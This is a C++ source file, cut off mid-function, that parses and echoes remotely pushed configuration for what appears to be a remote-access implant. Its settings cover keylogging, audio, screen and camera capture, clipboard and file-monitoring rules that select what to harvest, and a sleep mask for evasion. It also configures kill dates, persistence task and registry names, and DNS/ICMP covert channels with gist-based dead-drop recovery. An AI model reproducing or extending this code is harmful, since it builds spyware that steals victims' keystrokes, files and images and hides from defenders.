/**
 * @file AgentConfigJson.cpp
 * @brief 配置 <-> JSON 序列化层：ToJson/ApplyXxx 全族 + ApplyJson/DumpJson 实现
 * @details
 * 从 AgentConfig.cpp 拆出。职责：
 * - anonymous namespace 内私有：各配置结构体 <-> JSON 互转 + 字段校验/钳位
 *   （ToJson / ApplyHeartbeat / ApplyReconnect / ApplyChannelLimit 等）
 * - AgentConfig::ApplyJson：远程配置下发入口（写锁编排 ApplyXxx 一族）
 * - AgentConfig::DumpJson：当前生效配置全量回读（读锁编排 ToJson 一族）
 * 工具函数（ReadUInt/ReadInt/ReadString/ReadBool/Clamp）见 JsonField.hpp，
 * 位于 cleat::detail 命名空间；结构体定义与成员声明见 AgentConfig.hpp
 * （本文件不反向依赖）。
 */

#include "AgentConfig.hpp"
#include "ConfigContract.hpp"
#include "JsonField.hpp"

#include "Common/Logger/Logger.hpp"

#include <algorithm>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <optional>
#include <shared_mutex>
#include <utility>

namespace cleat {

    namespace {

        // ---- 配置结构体到 JSON 的转换辅助函数 ----

        /**
         * @brief 将 HeartbeatConfig 转换为 JSON
         */
        nlohmann::json ToJson(const HeartbeatConfig& hb) {
            return {
                {"base_interval_ms", hb.base_interval_ms},
                {"jitter_ratio_permille", hb.jitter_ratio_permille},
                {"active_interval_ms", hb.active_interval_ms},
                {"activity_window_ms", hb.activity_window_ms},
                {"jitter_distribution", hb.jitter_distribution},
                {"jitter_std_permille", hb.jitter_std_permille},
                {"jitter_mean_bias_permille", hb.jitter_mean_bias_permille},
                {"skip_beat_permille", hb.skip_beat_permille}
            };
        }

        /**
         * @brief 将 ReconnectConfig 转换为 JSON
         */
        nlohmann::json ToJson(const ReconnectConfig& rc) {
            return {
                {"first_connect_base_ms", rc.first_connect_base_ms},
                {"first_connect_max_ms", rc.first_connect_max_ms},
                {"base_ms", rc.base_ms},
                {"max_ms", rc.max_ms},
                {"jitter_permille", rc.jitter_permille}
            };
        }

        /**
         * @brief 将 TransportFailoverConfig 转换为 JSON
         */
        nlohmann::json ToJson(const TransportFailoverConfig& tf) {
            return {
                {"fail_threshold", tf.fail_threshold},
                {"min_hold_ms", tf.min_hold_ms},
                {"probe_interval_ms", tf.probe_interval_ms}
            };
        }

        /**
         * @brief 将 ServiceDefaults 转换为 JSON
         */
        nlohmann::json ToJson(const ServiceDefaults& sd) {
            return {
                {"audio_report_interval_ms", sd.audio_report_interval_ms},
                {"audio_sample_rate", sd.audio_sample_rate},
                {"audio_channels", sd.audio_channels},
                {"audio_bits_per_sample", sd.audio_bits_per_sample},
                {"keylog_report_interval_ms", sd.keylog_report_interval_ms},
                {"desktop_frame_interval_ms", sd.desktop_frame_interval_ms},
                {"camera_frame_interval_ms", sd.camera_frame_interval_ms},
                {"download_chunk_size", sd.download_chunk_size}
            };
        }

        /**
         * @brief 将 CaptureDefaults 转换为 JSON
         */
        nlohmann::json ToJson(const CaptureDefaults& cap) {
            return {
                {"screenshot_quality", cap.screenshot_quality},
                {"camera_quality", cap.camera_quality},
                {"screenshot_scale", cap.screenshot_scale}
            };
        }

        // ---- 应用 JSON 配置到各结构体的辅助函数 ----

        /**
         * @brief 应用心跳配置（含字段校验与钳位）
         * @param j  JSON 子对象
         * @param hb 心跳配置引用（将被修改）
         */
        void ApplyHeartbeat(const nlohmann::json& j, HeartbeatConfig& hb) {
            detail::ReadUInt(j, "base_interval_ms", hb.base_interval_ms);
            detail::ReadUInt(j, "jitter_ratio_permille", hb.jitter_ratio_permille);
            detail::ReadUInt(j, "active_interval_ms", hb.active_interval_ms);
            detail::ReadUInt(j, "activity_window_ms", hb.activity_window_ms);
            detail::ReadUInt(j, "jitter_distribution", hb.jitter_distribution);
            detail::ReadUInt(j, "jitter_std_permille", hb.jitter_std_permille);
            detail::ReadInt(j, "jitter_mean_bias_permille", hb.jitter_mean_bias_permille);
            detail::ReadUInt(j, "skip_beat_permille", hb.skip_beat_permille);

            hb.base_interval_ms = detail::Clamp(hb.base_interval_ms, 1000u, 3600000u);
            hb.jitter_ratio_permille = detail::Clamp(hb.jitter_ratio_permille, 0u, 1000u);
            hb.active_interval_ms = detail::Clamp(hb.active_interval_ms, 500u, 60000u);
            hb.activity_window_ms = detail::Clamp(hb.activity_window_ms, 1000u, 600000u);
            hb.jitter_distribution = detail::Clamp(hb.jitter_distribution, 0u, 1u);
            hb.jitter_std_permille = detail::Clamp(hb.jitter_std_permille, 0u, 1000u);
            hb.skip_beat_permille = detail::Clamp(hb.skip_beat_permille, 0u, 1000u);

            // C4 修复: std::abs(INT_MIN) 是补码 UB —— 提升到 long long
            // 再取绝对值, 消除 INT_MIN 特例(JSON 可传任意 int)。
            const long long bias = hb.jitter_mean_bias_permille;   // 保留符号
            hb.jitter_mean_bias_permille =
                detail::Clamp(static_cast<int>(std::llabs(bias)), 0, 1000)
                * (bias < 0 ? -1 : 1);
        }

        /**
         * @brief 应用重连退避配置（含字段校验与钳位）
         */
        void ApplyReconnect(const nlohmann::json& j, ReconnectConfig& rc) {
            detail::ReadUInt(j, "first_connect_base_ms", rc.first_connect_base_ms);
            detail::ReadUInt(j, "first_connect_max_ms", rc.first_connect_max_ms);
            detail::ReadUInt(j, "base_ms", rc.base_ms);
            detail::ReadUInt(j, "max_ms", rc.max_ms);
            detail::ReadUInt(j, "jitter_permille", rc.jitter_permille);

            rc.first_connect_base_ms = detail::Clamp(rc.first_connect_base_ms, 100, 300000);
            rc.first_connect_max_ms = detail::Clamp(rc.first_connect_max_ms, rc.first_connect_base_ms, 300000);
            rc.base_ms = detail::Clamp(rc.base_ms, 100, 300000);
            rc.max_ms = detail::Clamp(rc.max_ms, rc.base_ms, 300000);
            rc.jitter_permille = detail::Clamp(rc.jitter_permille, 0, 1000);
        }

        /**
         * @brief 应用睡眠掩码配置（含字段校验与钳位;  MaskWindow 设计）
         * @details enabled 默认 false; 窗长钳位 **[30000, 120000]ms**(运营面下限 30s,
         *           裁定: 短窗掩码收益薄而固定开销占比高 —— 链本身 ≈2s
         *          (加密延迟 1.5s + 步间隔/屏障), 5s 窗有 ~40% 时间在做密码学搬运;
         *          引擎/自检面不受此限: SleepMaskProbe 命令与 maskprobe 保留亚秒窗,
         *          属隔离测试路径)。抖动钳位 [0, 1000]。执行体需 CLEAT_WITH_MASK=ON ——
         *          配置无条件生效, 未编入时由判定层按"不可用"拒绝, 不产生任何行为差异。
         */
        void ApplyMask(const nlohmann::json& j, MaskConfig& m) {
            detail::ReadBool(j, "enabled", m.enabled);
            detail::ReadUInt(j, "sleep_ms", m.sleep_ms);
            detail::ReadUInt(j, "jitter_permille", m.jitter_permille);

            m.sleep_ms = detail::Clamp(m.sleep_ms, 30000u, 120000u);
            m.jitter_permille = detail::Clamp(m.jitter_permille, 0u, 1000u);
        }

        /// 通道链转 JSON(与下发格式一致, 供 applied 回显)
        nlohmann::json ToJson(const std::vector<ChannelSpec>& channels) {
            nlohmann::json arr = nlohmann::json::array();
            for (const auto& s : channels) {
                nlohmann::json item = { {"type", s.type} };
                if (!s.host.empty())        item["host"] = s.host;
                if (s.port != 0)            item["port"] = s.port;
                if (!s.url.empty())         item["url"] = s.url;
                if (!s.upload_url.empty())  item["upload_url"] = s.upload_url;
                if (!s.dns_server.empty())  item["dns_server"] = s.dns_server;
                if (!s.dns_domain.empty())  item["dns_domain"] = s.dns_domain;
                if (!s.icmp_target.empty()) item["icmp_target"] = s.icmp_target;
                arr.push_back(std::move(item));
            }
            return arr;
        }

        /**
         * @brief 应用传输降级链配置（含字段校验与钳位）
         */
        void ApplyTransportFailover(const nlohmann::json& j, TransportFailoverConfig& tf) {
            detail::ReadUInt(j, "fail_threshold", tf.fail_threshold);
            detail::ReadUInt(j, "min_hold_ms", tf.min_hold_ms);
            detail::ReadUInt(j, "probe_interval_ms", tf.probe_interval_ms);

            tf.fail_threshold = detail::Clamp(tf.fail_threshold, 1, 100);
            tf.min_hold_ms = detail::Clamp(tf.min_hold_ms, 1000, 3600000);
            tf.probe_interval_ms = detail::Clamp(tf.probe_interval_ms, 5000, 3600000);
        }

        /**
         * @brief 应用服务默认参数（含字段校验与钳位）
         */
        void ApplyServiceDefaults(const nlohmann::json& j, ServiceDefaults& sd) {
            detail::ReadUInt(j, "audio_report_interval_ms", sd.audio_report_interval_ms);
            detail::ReadUInt(j, "audio_sample_rate", sd.audio_sample_rate);
            detail::ReadUInt(j, "audio_channels", sd.audio_channels);
            detail::ReadUInt(j, "audio_bits_per_sample", sd.audio_bits_per_sample);
            detail::ReadUInt(j, "keylog_report_interval_ms", sd.keylog_report_interval_ms);
            detail::ReadUInt(j, "desktop_frame_interval_ms", sd.desktop_frame_interval_ms);
            detail::ReadUInt(j, "camera_frame_interval_ms", sd.camera_frame_interval_ms);
            detail::ReadUInt(j, "download_chunk_size", sd.download_chunk_size);

            sd.audio_report_interval_ms = detail::Clamp(sd.audio_report_interval_ms, 1000, 60000);
            sd.audio_sample_rate = detail::Clamp(sd.audio_sample_rate, 8000, 192000);
            sd.audio_channels = detail::Clamp(sd.audio_channels, 1, 2);
            sd.audio_bits_per_sample = detail::Clamp(sd.audio_bits_per_sample, 8, 32);
            sd.keylog_report_interval_ms = detail::Clamp(sd.keylog_report_interval_ms, 1000, 60000);
            sd.desktop_frame_interval_ms = detail::Clamp(sd.desktop_frame_interval_ms, 100, 60000);
            sd.camera_frame_interval_ms = detail::Clamp(sd.camera_frame_interval_ms, 100, 60000);
            sd.download_chunk_size = detail::Clamp(sd.download_chunk_size, 1024, 10 * 1024 * 1024);
        }

        /**
         * @brief 应用剪贴板监听配置（含字段校验与规则数组解析）
         */
        void ApplyClipboard(const nlohmann::json& j, ClipboardConfig& cc) {
            detail::ReadUInt(j, "monitor_interval_ms", cc.monitor_interval_ms);
            detail::ReadUInt(j, "max_report_len", cc.max_report_len);
            detail::ReadUInt(j, "min_len", cc.min_len);

            cc.monitor_interval_ms = detail::Clamp(cc.monitor_interval_ms, 200, 60000);
            cc.max_report_len = detail::Clamp(cc.max_report_len, 64, 65536);
            cc.min_len = detail::Clamp(cc.min_len, 1, 1024);

            auto itRules = j.find("rules");
            if (itRules != j.end() && itRules->is_array()) {
                cc.rules.clear();
                for (const auto& r : *itRules) {
                    if (!r.is_object()) continue;
                    ClipboardRule rule;
                    if (auto it = r.find("name"); it != r.end() && it->is_string()) {
                        rule.name = it->get<std::string>();
                    }
                    if (auto it = r.find("type"); it != r.end() && it->is_string()) {
                        rule.type = it->get<std::string>();
                    }
                    if (auto it = r.find("pattern"); it != r.end() && it->is_string()) {
                        rule.pattern = it->get<std::string>();
                    }
                    if (auto it = r.find("keywords"); it != r.end() && it->is_array()) {
                        for (const auto& k : *it) {
                            if (k.is_string()) rule.keywords.push_back(k.get<std::string>());
                        }
                    }
                    if (rule.type == "regex" || rule.type == "keyword" || rule.type == "always") {
                        cc.rules.push_back(std::move(rule));
                    }
                }
            }
        }

        /**
         * @brief 将 ClipboardConfig 转换为 JSON
         */
        nlohmann::json ToJson(const ClipboardConfig& cc) {
            nlohmann::json rules = nlohmann::json::array();
            for (const auto& r : cc.rules) {
                rules.push_back({
                    {"name", r.name},
                    {"type", r.type},
                    {"pattern", r.pattern},
                    {"keywords", r.keywords}
                    });
            }
            return {
                {"monitor_interval_ms", cc.monitor_interval_ms},
                {"max_report_len", cc.max_report_len},
                {"min_len", cc.min_len},
                {"rules", rules}
            };
        }

        /**
         * @brief 应用文件监控配置（含字段校验与规则数组解析）
         */
        void ApplyFileMonitor(const nlohmann::json& j, FileMonitorConfig& fm) {
            if (auto it = j.find("path"); it != j.end() && it->is_string()) {
                fm.path = it->get<std::string>();
            }
            if (auto it = j.find("recursive"); it != j.end() && it->is_boolean()) {
                fm.recursive = it->get<bool>();
            }
            if (auto it = j.find("watch"); it != j.end() && it->is_array()) {
                fm.watch.clear();
                for (const auto& w : *it) {
                    if (w.is_string()) fm.watch.push_back(w.get<std::string>());
                }
            }
            auto itRules = j.find("rules");
            if (itRules != j.end() && itRules->is_array()) {
                fm.rules.clear();
                for (const auto& r : *itRules) {
                    if (!r.is_object()) continue;
                    FileMonitorRule rule;
                    if (auto it = r.find("name"); it != r.end() && it->is_string()) {
                        rule.name = it->get<std::string>();
                    }
                    if (auto it = r.find("type"); it != r.end() && it->is_string()) {
                        rule.type = it->get<std::string>();
                    }
                    if (auto it = r.find("extensions"); it != r.end() && it->is_array()) {
                        for (const auto& e : *it) {
                            if (e.is_string()) rule.extensions.push_back(e.get<std::string>());
                        }
                    }
                    if (auto it = r.find("pattern"); it != r.end() && it->is_string()) {
                        rule.pattern = it->get<std::string>();
                    }
                    if (rule.type == "extension" || rule.type == "path_regex"
                        || rule.type == "always") {
                        fm.rules.push_back(std::move(rule));
                    }
                }
            }
        }

        /**
         * @brief 将 FileMonitorConfig 转换为 JSON
         */
        nlohmann::json ToJson(const FileMonitorConfig& fm) {
            nlohmann::json rules = nlohmann::json::array();
            for (const auto& r : fm.rules) {
                rules.push_back({
                    {"name", r.name},
                    {"type", r.type},
                    {"extensions", r.extensions},
                    {"pattern", r.pattern}
                    });
            }
            return {
                {"path", fm.path},
                {"recursive", fm.recursive},
                {"watch", fm.watch},
                {"rules", rules}
            };
        }

        /// "HH:MM" → 当日分钟数; 非法返回 nullopt(该键保留原值)
        std::optional<uint32_t> ParseHHMM(const nlohmann::json& j) {
            if (!j.is_string()) return std::nullopt;
            const std::string s = j.get<std::string>();
            int h = 0, m = 0;
            if (std::sscanf(s.c_str(), "%d:%d", &h, &m) != 2) return std::nullopt;
            if (h < 0 || h > 23 || m < 0 || m > 59) return std::nullopt;
            return static_cast<uint32_t>(h) * 60 + m;
        }

        /// 当日分钟数 → "HH:MM"
        std::string FormatHHMM(uint32_t minute) {
            char buf[8]{};
            std::snprintf(buf, sizeof(buf), "%02u:%02u",
                          static_cast<unsigned>(minute / 60), static_cast<unsigned>(minute % 60));
            return buf;
        }

        /**
         * @brief 将 RecoveryConfig 转换为 JSON(归一态: 只输出 platforms, 不含旧别名)
         * @details 主密钥(key)**刻意不回读** —— 敏感材料, 回显进 getconfig 响应/
         *          日志等于明文出站; 运营核对以 applied 的下发回执为准。
         */
        nlohmann::json ToJson(const AgentConfig::RecoveryConfig& rc) {
            nlohmann::json plats = nlohmann::json::array();
            for (const auto& p : rc.platforms) {
                plats.push_back({ {"type", p.type}, {"url", p.url} });
            }
            return {
                {"prefix", rc.prefix},
                {"platforms", std::move(plats)},
                {"recover_after_fails", rc.recover_after_fails},
                {"retry_min_minutes", rc.retry_min_minutes},
                {"retry_max_minutes", rc.retry_max_minutes},
                {"upload_path", rc.upload_path}
            };
        }

        /**
         * @brief 应用 RecoveryConfig(含旧别名 api_url 的输入兼容)
         * @details 键: prefix / api_url(旧别名, 归一成单 gist 平台) / key /
         *          upload_path / recover_after_fails / retry_min_minutes /
         *          retry_max_minutes / platforms([{type,url}] 有序 = 优先级)。
         *          platforms = **整体替换**(清单是"现状"而非增量); 非法键值保留原值。
         */
        void ApplyRecovery(const nlohmann::json& j, AgentConfig::RecoveryConfig& rc) {
            if (detail::ReadString(j, "prefix", rc.prefix)) {
                if (rc.prefix.size() > 256) rc.prefix.resize(256);
            }
            // 旧别名 api_url: 只作输入兼容, 解析即归一, 不入结构体(无第二份状态)
            std::string legacy_api_url;
            if (detail::ReadString(j, "api_url", legacy_api_url)) {
                if (legacy_api_url.size() > 2048) legacy_api_url.resize(2048);
            }
            if (detail::ReadString(j, "key", rc.key)) {
                if (rc.key.size() > 256) rc.key.resize(256);
            }
            if (detail::ReadString(j, "upload_path", rc.upload_path)) {
                if (rc.upload_path.size() > 256) rc.upload_path.resize(256);
            }
            if (detail::ReadUInt(j, "recover_after_fails", rc.recover_after_fails)) {
                rc.recover_after_fails = detail::Clamp(rc.recover_after_fails, 2, 200);
            }
            // 重试节奏(先快后慢): 分钟级, 0 = 跟随重连退避(无独立等待); 上限 7 天
            if (detail::ReadUInt(j, "retry_min_minutes", rc.retry_min_minutes)) {
                rc.retry_min_minutes = detail::Clamp(rc.retry_min_minutes, 0, 10080);
            }
            if (detail::ReadUInt(j, "retry_max_minutes", rc.retry_max_minutes)) {
                rc.retry_max_minutes = detail::Clamp(rc.retry_max_minutes, 0, 10080);
            }
            const auto itPlats = j.find("platforms");
            if (itPlats != j.end() && itPlats->is_array()) {
                std::vector<AgentConfig::RecoveryConfig::PlatformSpec> parsed;
                for (const auto& item : *itPlats) {
                    if (!item.is_object() || parsed.size() >= 8) break;   // 上限 8 平台
                    AgentConfig::RecoveryConfig::PlatformSpec spec;
                    if (!detail::ReadString(item, "type", spec.type)) continue;
                    for (auto& c : spec.type) {
                        c = static_cast<char>(::tolower(static_cast<unsigned char>(c)));
                    }
                    if (!detail::ReadString(item, "url", spec.url)) continue;
                    if (spec.type.empty() || spec.url.empty()
                        || spec.url.size() > 2048) continue;   // 残缺条目跳过(不整体拒绝)
                    parsed.push_back(std::move(spec));
                }
                rc.platforms = std::move(parsed);
            }
            else if (!legacy_api_url.empty()) {
                // 兼容别名归一: 旧形态单平台(整体替换 —— api_url 语义即"平台就这一个")
                rc.platforms.assign(1, { "gist", legacy_api_url });
            }
        }

        /**
         * @brief 应用生命周期治理配置
         * @details 键: kill_date_utc(epoch 秒, 0=清除) / work_start("HH:MM") /
         *          work_end("HH:MM") / outside_policy("pause"|"exit")。
         *          非法键值保留原值(与 ApplyClipboard 的容错取向一致)。
         */
        void ApplyLifecycle(const nlohmann::json& j, LifecycleConfig& lc) {
            // epoch 数值兼容两种整数态: 字面量 0 是 number_integer, uint64 大数才是
            // number_unsigned —— 只收 unsigned 会让"清除 killdate"静默失败(实测踩坑:
            // 测试恢复默认失效, 过期 killdate 一路污染后续用例)。负数拒绝(保留原值)。
            if (auto it = j.find("kill_date_utc"); it != j.end() && it->is_number()) {
                if (it->is_number_unsigned()) {
                    lc.kill_date_utc = it->get<uint64_t>();
                }
                else if (it->is_number_integer() && it->get<int64_t>() >= 0) {
                    lc.kill_date_utc = static_cast<uint64_t>(it->get<int64_t>());
                }
            }
            if (auto it = j.find("work_start"); it != j.end()) {
                if (auto v = ParseHHMM(*it)) lc.work_start_minute = *v;
            }
            if (auto it = j.find("work_end"); it != j.end()) {
                if (auto v = ParseHHMM(*it)) lc.work_end_minute = *v;
            }
            if (auto it = j.find("outside_policy"); it != j.end() && it->is_string()) {
                const std::string p = it->get<std::string>();
                if (p == "pause") lc.outside_exit = false;
                else if (p == "exit") lc.outside_exit = true;
            }
        }

        /**
         * @brief 将 LifecycleConfig 转换为 JSON
         */
        nlohmann::json ToJson(const LifecycleConfig& lc) {
            return {
                {"kill_date_utc", lc.kill_date_utc},
                {"work_start", FormatHHMM(lc.work_start_minute)},
                {"work_end", FormatHHMM(lc.work_end_minute)},
                {"outside_policy", lc.outside_exit ? "exit" : "pause"}
            };
        }

        /**
         * @brief 将 ChannelLimitRule 转换为 JSON
         */
        nlohmann::json ToJson(const ChannelLimitRule& r) {
            return {
                {"max_bytes", r.max_bytes},
                {"rate_per_min", r.rate_per_min}
            };
        }

        /**
         * @brief 将 ChannelLimitConfig 转换为 JSON
         */
        nlohmann::json ToJson(const ChannelLimitConfig& cc) {
            nlohmann::json cmds = nlohmann::json::object();
            for (const auto& [k, v] : cc.commands) {
                cmds[k] = ToJson(v);
            }
            return {
                {"enabled", cc.enabled},
                {"deny", cc.deny},
                {"commands", std::move(cmds)},
                {"default", ToJson(cc.default_rule)}
            };
        }

        /**
         * @brief 应用低带宽通道限流配置（含字段校验与钳位）
         */
        void ApplyChannelLimit(const nlohmann::json& j, ChannelLimitConfig& cc) {
            if (j.contains("enabled") && j["enabled"].is_boolean()) {
                cc.enabled = j["enabled"].get<bool>();
            }
            if (j.contains("deny") && j["deny"].is_array()) {
                cc.deny.clear();
                for (const auto& e : j["deny"]) {
                    if (e.is_string()) {
                        cc.deny.push_back(e.get<std::string>());
                    }
                }
            }
            if (j.contains("commands") && j["commands"].is_object()) {
                cc.commands.clear();
                for (auto it = j["commands"].begin(); it != j["commands"].end(); ++it) {
                    if (!it.value().is_object()) {
                        continue;
                    }
                    ChannelLimitRule r;
                    detail::ReadUInt(it.value(), "max_bytes", r.max_bytes);
                    detail::ReadUInt(it.value(), "rate_per_min", r.rate_per_min);
                    // 原实现只钳 default, 下发 max_bytes=4GB 可让低带宽通道
                    // (DNS/ICMP, 物理上限 ~28KB)的单帧上限形同虚设。
                    r.max_bytes = detail::Clamp(r.max_bytes, 0, 16 * 1024 * 1024);
                    r.rate_per_min = detail::Clamp(r.rate_per_min, 0, 10000);
                    cc.commands[it.key()] = r;
                }
            }
            if (j.contains("default") && j["default"].is_object()) {
                detail::ReadUInt(j["default"], "max_bytes", cc.default_rule.max_bytes);
                detail::ReadUInt(j["default"], "rate_per_min", cc.default_rule.rate_per_min);
            }
            cc.default_rule.max_bytes = detail::Clamp(cc.default_rule.max_bytes, 0, 16 * 1024 * 1024);
            cc.default_rule.rate_per_min = detail::Clamp(cc.default_rule.rate_per_min, 0, 10000);
        }

        /**
         * @brief 应用采集默认参数（含字段校验与钳位）
         */
        void ApplyCapture(const nlohmann::json& j, CaptureDefaults& cap) {
            detail::ReadUInt(j, "screenshot_quality", cap.screenshot_quality);
            detail::ReadUInt(j, "camera_quality", cap.camera_quality);
            detail::ReadUInt(j, "screenshot_scale", cap.screenshot_scale);

            cap.screenshot_quality = detail::Clamp(cap.screenshot_quality, 1, 100);
            cap.camera_quality = detail::Clamp(cap.camera_quality, 1, 100);
            cap.screenshot_scale = detail::Clamp(cap.screenshot_scale, 1, 400);
        }

    } // namespace

    /**
     * @brief 应用远程下发的 JSON 配置（写锁）
     * @param params JSON 对象，包含需要更新的配置键值
     * @return 实际生效配置的 JSON 摘要（包含所有成功应用且经过钳位的字段）
     * @details
     * 此函数是远程配置下发的入口，顶级键=契约(ConfigContract.hpp)的 15 个子域：
     * - heartbeat, reconnect, transport_failover, recovery, channels, channel_limit,
     *   service_defaults, capture, clipboard, file_monitor, lifecycle
     * - runtime(first_connect_delay_max_ms/worker_timeout_ms/log_level; crash_dump_enabled 已移除, 崩溃日志改由构建期决定)
     * - http(user_agent/ignore_cert/proxy/mimic)
     * - quic(ignore_cert)
     * - persist(value_name/task_name/author)
     *   ——  散键归位: 原 10 个顶层散键收拢进 runtime/http/persist 三域,
     *      **不做旧散键兼容**(旧键 = 未知字段, 按既有约定忽略; 只推旧键的 SetConfig
     *      会因 applied 为空被打成 Error, 控制面据此可感知迁移)。
     *
     * 所有数值字段都会经过范围校验与钳位，保证配置合法；
     * 字符串字段直接赋值（空串可清除显式值）。
     * 不认识的字段会被忽略，不影响已有配置。
     *
     * 回显语义两族(历史并存, 各有依赖方):
     * - 结构体域(heartbeat 等): applied[域] = **整域回显**(当前生效全量);
     * - runtime/http/persist(原散键): applied[域] = **本次实际应用字段** ——
     *   SetConfigHandler 的 N30 log_level 门控依赖
     *   "回执含 log_level ⟺ 本次真携带了合法 log_level"(整域回显会破坏该信号,
     *   把 Logger 拉回配置默认、抹掉运行时 DEBUG 覆盖)。
     */
    nlohmann::json AgentConfig::ApplyJson(const nlohmann::json& params) {
        std::unique_lock<std::shared_mutex> lock(mutex_);
        nlohmann::json applied;

        // ---- runtime 域(原顶层散键 first_connect_delay_max_ms/worker_timeout_ms/
        //      log_level 归位; 字段级门控/钳位与散键时代一致; crash_dump_enabled 已于  移除) ----
        auto itRt = params.find("runtime");
        if (itRt != params.end() && itRt->is_object()) {
            nlohmann::json rt;
            if (detail::ReadUInt(*itRt, "first_connect_delay_max_ms", first_connect_delay_max_ms_)) {
                first_connect_delay_max_ms_ = detail::Clamp(first_connect_delay_max_ms_, 0, 300000);
                rt["first_connect_delay_max_ms"] = first_connect_delay_max_ms_;
            }
            if (detail::ReadUInt(*itRt, "worker_timeout_ms", worker_timeout_ms_)) {
                worker_timeout_ms_ = (worker_timeout_ms_ == 0) ? 0
                    : detail::Clamp(worker_timeout_ms_, 100, 3600000);
                rt["worker_timeout_ms"] = worker_timeout_ms_;
            }
            if (detail::ReadInt(*itRt, "log_level", log_level_, 0, 4)) {
                log_level_ = detail::Clamp(log_level_, 0, 4);   // 0=DEBUG 1=INFO 2=WARN 3=ERROR 4=OFF
                rt["log_level"] = log_level_;
            }
            // : crash_dump_enabled 键已移除 —— 崩溃日志改由
            // 构建期决定(Debug 恒开/Release 恒关), 运行期下发不再识别(未知键忽略)。
            if (!rt.empty()) applied["runtime"] = std::move(rt);
        }
        // ---- http 域(原 http_user_agent/https_ignore_cert/https_proxy 归位改名) ----
        auto itHttp = params.find("http");
        if (itHttp != params.end() && itHttp->is_object()) {
            nlohmann::json http;
            if (detail::ReadString(*itHttp, "user_agent", http_user_agent)) {
                http["user_agent"] = http_user_agent;
            }
            if (detail::ReadBool(*itHttp, "ignore_cert", https_ignore_cert)) {
                http["ignore_cert"] = https_ignore_cert;
            }
            if (detail::ReadString(*itHttp, "proxy", https_proxy)) {
                http["proxy"] = https_proxy;
            }
            if (detail::ReadBool(*itHttp, "mimic", tcp_mimic)) {
                http["mimic"] = tcp_mimic;
            }
            if (!http.empty()) applied["http"] = std::move(http);
        }
        // ---- quic 域(QUIC 通道选项; 读写模式对齐 http 域) ----
        auto itQuic = params.find("quic");
        if (itQuic != params.end() && itQuic->is_object()) {
            nlohmann::json quic;
            if (detail::ReadBool(*itQuic, "ignore_cert", quic_ignore_cert)) {
                quic["ignore_cert"] = quic_ignore_cert;
            }
            if (!quic.empty()) applied["quic"] = std::move(quic);
        }
        // ---- mask 域(睡眠掩码;  MaskWindow 设计) ----
        // 执行体还需构建期 CLEAT_WITH_MASK=ON; 配置面无条件存在(回读/契约一致),
        // 未编入产物时 MaskGate 按平台不可用拒绝, enabled=true 不产生行为差异。
        auto itMask = params.find("mask");
        if (itMask != params.end() && itMask->is_object()) {
            MaskConfig m = mask_;
            ApplyMask(*itMask, m);
            mask_ = m;
            applied["mask"] = {
                {"enabled", mask_.enabled},
                {"sleep_ms", mask_.sleep_ms},
                {"jitter_permille", mask_.jitter_permille},
            };
        }
        // ---- persist 域(原 persist_value_name/persist_task_name/persist_author 归位) ----
        auto itPersist = params.find("persist");
        if (itPersist != params.end() && itPersist->is_object()) {
            nlohmann::json persist;
            if (detail::ReadString(*itPersist, "value_name", persist_value_name_)) {
                persist["value_name"] = persist_value_name_;
            }
            if (detail::ReadString(*itPersist, "task_name", persist_task_name_)) {
                persist["task_name"] = persist_task_name_;
            }
            if (detail::ReadString(*itPersist, "author", persist_author_)) {
                persist["author"] = persist_author_;
            }
            if (!persist.empty()) applied["persist"] = std::move(persist);
        }

        auto itHb = params.find("heartbeat");
        if (itHb != params.end() && itHb->is_object()) {
            ApplyHeartbeat(*itHb, heartbeat_);
            applied["heartbeat"] = ToJson(heartbeat_);
        }
        auto itRc = params.find("reconnect");
        if (itRc != params.end() && itRc->is_object()) {
            ApplyReconnect(*itRc, reconnect_);
            applied["reconnect"] = ToJson(reconnect_);
        }
        auto itTf = params.find("transport_failover");
        if (itTf != params.end() && itTf->is_object()) {
            ApplyTransportFailover(*itTf, transport_failover_);
            applied["transport_failover"] = ToJson(transport_failover_);
        }
        // channels 域: 运行期整体替换降级链(热切换)。整条链校验通过才应用并
        // bump revision(主循环 watcher 触发 TransportSelector 原子换链);
        // 任一元素非法 → 整体拒绝, 旧链不受影响。
        // N44 recovery 域: 死投递恢复参数(prefix/key/阈值/平台清单)。解析收口在
        // ApplyRecovery(含旧别名 api_url 的输入兼容), 回读收口在 ToJson(归一态)。
        auto itDd = params.find("recovery");
        if (itDd != params.end() && itDd->is_object()) {
            RecoveryConfig rc = recovery_;
            ApplyRecovery(*itDd, rc);
            recovery_ = rc;
            applied["recovery"] = ToJson(rc);
        }
        auto itCh = params.find("channels");
        if (itCh != params.end()) {
            nlohmann::json chResult;
            if (!itCh->is_array() || itCh->empty()) {
                chResult["error"] = "channels must be a non-empty array";
            }
            else {
                std::vector<ChannelSpec> parsed;
                bool ok = true;
                std::string err;
                for (size_t i = 0; i < itCh->size(); ++i) {
                    const auto& item = (*itCh)[i];
                    ChannelSpec s;
                    if (!item.is_object()) {
                        ok = false; err = "channels[" + std::to_string(i) + "] must be an object"; break;
                    }
                    if (item.contains("type") && item["type"].is_string()) {
                        s.type = item["type"].get<std::string>();
                        for (auto& c : s.type) c = static_cast<char>(::tolower(static_cast<unsigned char>(c)));
                    }
                    if (item.contains("host") && item["host"].is_string()) s.host = item["host"].get<std::string>();
                    if (item.contains("port")) {
                        const auto& jp = item["port"];
                        // (第十七轮): 与 JsonField()同口径 —— is_number() 对 float
                        // 亦为真, 越界 double→整型转换是 UB; 且同文件其它字段均为整型判定。
                        // unsigned 分支先在无符号域比较再收窄(> INT64_MAX 的回绕是实现定义)。
                        bool port_ok = false;
                        int64_t v = 0;
                        if (jp.is_number_unsigned()) {
                            const uint64_t u = jp.get<uint64_t>();
                            if (u <= 65535) { v = static_cast<int64_t>(u); port_ok = true; }
                        }
                        else if (jp.is_number_integer()) {
                            v = jp.get<int64_t>();
                            port_ok = (v >= 0 && v <= 65535);
                        }
                        if (!port_ok) {
                            ok = false;
                            err = "channels[" + std::to_string(i) + "].port must be an integer in [0, 65535]";
                            break;
                        }
                        s.port = static_cast<uint16_t>(v);
                    }
                    if (item.contains("url") && item["url"].is_string()) s.url = item["url"].get<std::string>();
                    if (item.contains("upload_url") && item["upload_url"].is_string()) s.upload_url = item["upload_url"].get<std::string>();
                    if (item.contains("dns_server") && item["dns_server"].is_string()) s.dns_server = item["dns_server"].get<std::string>();
                    if (item.contains("dns_domain") && item["dns_domain"].is_string()) s.dns_domain = item["dns_domain"].get<std::string>();
